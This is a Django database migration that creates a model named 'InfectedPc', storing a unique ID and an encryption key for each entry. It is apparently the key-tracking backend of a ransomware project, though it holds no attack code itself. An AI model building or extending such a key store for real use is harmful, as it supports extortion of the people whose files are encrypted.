# Generated by Django 2.0.3 on 2020-03-26 13:45

from django.db import migrations, models


class Migration(migrations.Migration):

    initial = True

    dependencies = [
    ]

    operations = [
        migrations.CreateModel(
            name='InfectedPc',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('uniqueId', models.CharField(max_length=255)),
                ('encryptionKey', models.CharField(max_length=255)),
            ],
        ),
    ]
